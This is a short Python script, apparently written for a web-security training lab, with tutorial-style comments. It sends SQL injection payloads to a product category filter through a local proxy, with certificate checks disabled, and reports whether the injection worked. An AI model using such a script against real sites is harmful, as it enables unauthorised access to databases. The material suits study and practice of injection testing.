import requests

# import requests is a library that allows you to send HTTP requests using Python.
# The requests library is used to make HTTP requests to web servers and retrieve data from them.
# It simplifies interacting with APis of retrieving web data.

import sys
# import the sys module to access system-specific parameters and functions.
# common uses include handling command-line arguments, interacting with the interpreter, or exiting the program.

import urllib3
# import the urllib3 module to provide a high-level interface for making HTTP requests.
# urllib3 is a powerful and flexible HTTP client library for Python.

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
# a python dictionary named proxies that specifies proxy servers to be used for http and https requests.
# the proxy server acts as a intermediary between your device and the internet.
#  It can be use to mask your IP address,
#  control or monitor network traffic
#  Add an extra layer of anonymity or security
# Web scrapping(avoiding ip basn or rate-limiting), Penetration testing, Bypassing restrictions

# This line sends a GET request to the specified URL and stores the response in the 'response' variable.

# print(sys.argv)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
def exploit_sqlinjection(url, payload):
    
    uri = '/filter?category='
    response = requests.get(url + uri + payload, verify=False, proxies=proxies)

    if "Cheshire Cat Grin"in response.text:
       return True
    else:
       return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])  
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqlinjection(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")    